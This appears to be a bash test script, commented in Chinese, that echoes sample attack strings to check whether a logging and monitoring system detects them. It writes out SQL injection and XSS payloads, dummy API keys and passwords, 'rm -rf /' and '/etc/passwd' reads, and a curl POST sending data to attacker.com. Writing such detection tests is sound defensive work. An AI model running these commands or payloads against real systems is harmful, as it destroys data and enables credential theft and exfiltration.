#!/bin/bash
# 测试文件5：综合攻击场景模拟
# 用途：测试日志系统能否检测到多种类型的攻击

echo "===== 综合攻击测试文件 ====="
echo "用途：测试日志系统的检测能力"
echo "包含：SQL注入、XSS、API Key、危险代码等多种风险"
echo ""

# ===== 1. SQL注入攻击 =====
echo "===== SQL注入测试 ====="
# 模拟恶意SQL查询
MALICIOUS_SQL="SELECT * FROM users WHERE id='1' OR '1'='1' UNION SELECT username, password FROM users--"
echo "恶意SQL: $MALICIOUS_SQL"

# SQL注入payload
SQL_PAYLOAD_1="admin'; DROP TABLE users; --"
SQL_PAYLOAD_2="1' OR '1'='1"
SQL_PAYLOAD_3="'; UPDATE users SET password='hacked' WHERE '1'='1"

echo "SQL Payload 1: $SQL_PAYLOAD_1"
echo "SQL Payload 2: $SQL_PAYLOAD_2"
echo "SQL Payload 3: $SQL_PAYLOAD_3"

# ===== 2. XSS攻击 =====
echo ""
echo "===== XSS攻击测试 ====="
# XSS payloads
XSS_PAYLOAD_1="<script>alert('XSS')</script>"
XSS_PAYLOAD_2="<img src='x' onerror='alert(\"XSS\")'>"
XSS_PAYLOAD_3="<svg onload='alert(\"XSS\")'>"
XSS_PAYLOAD_4="javascript:alert('XSS')"

echo "XSS Payload 1: $XSS_PAYLOAD_1"
echo "XSS Payload 2: $XSS_PAYLOAD_2"
echo "XSS Payload 3: $XSS_PAYLOAD_3"
echo "XSS Payload 4: $XSS_PAYLOAD_4"

# ===== 3. API Key泄露 =====
echo ""
echo "===== API Key泄露测试 ====="
# 模拟API Keys
OPENAI_KEY="sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890"
GITHUB_TOKEN="ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
AWS_KEY="AKIAIOSFODNN7EXAMPLE"

echo "OpenAI Key: $OPENAI_KEY"
echo "GitHub Token: $GITHUB_TOKEN"
echo "AWS Key: $AWS_KEY"

# ===== 4. 危险代码执行 =====
echo ""
echo "===== 危险代码执行测试 ====="
# 模拟危险代码
EVAL_CODE="eval('malicious code')"
EXEC_CODE="exec('rm -rf /')"
SYSTEM_CMD="os.system('cat /etc/passwd')"

echo "Eval Code: $EVAL_CODE"
echo "Exec Code: $EXEC_CODE"
echo "System Command: $SYSTEM_CMD"

# ===== 5. 敏感信息 =====
echo ""
echo "===== 敏感信息测试 ====="
# 模拟敏感信息
PASSWORD="password123"
DB_PASSWORD="Admin@2026!"
SECRET_KEY="my-secret-key-do-not-share"
PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----"

echo "Password: $PASSWORD"
echo "DB Password: $DB_PASSWORD"
echo "Secret Key: $SECRET_KEY"
echo "Private Key: $PRIVATE_KEY"

# ===== 6. 网络攻击 =====
echo ""
echo "===== 网络攻击测试 ====="
# 模拟恶意URL
MALICIOUS_URL="http://malicious-site.com/steal?cookie="
DATA_EXFIL="curl -X POST http://attacker.com/exfil -d 'data=stolen'"

echo "Malicious URL: $MALICIOUS_URL"
echo "Data Exfiltration: $DATA_EXFIL"

# ===== 测试总结 =====
echo ""
echo "===== 测试总结 ====="
echo "此文件包含以下风险类型："
echo "1. ✅ SQL注入 - 3个payload"
echo "2. ✅ XSS攻击 - 4个payload"
echo "3. ✅ API Key泄露 - 3个key"
echo "4. ✅ 危险代码执行 - eval/exec/system"
echo "5. ✅ 敏感信息泄露 - 密码/密钥"
echo "6. ✅ 网络攻击 - 恶意URL/数据窃取"
echo ""
echo "如果日志系统正常工作，应该会在控制台输出："
echo "- [监控回调] 触发检测"
echo "- [监控回调] 风险详情"
echo "- [主动监控] 行为解析完成"
echo "- [主动监控] 风险评估完成"
echo "- [风险提示] 触发"
echo "- [桌宠状态] 更新"
echo ""
echo "===== 测试文件结束 ====="

# ===== 实际危险命令（注释掉，不要执行） =====
# 以下命令仅供演示，实际测试时请勿执行
# eval "echo 'This is dangerous'"
# exec "ls -la"
# curl "http://malicious-site.com/attack"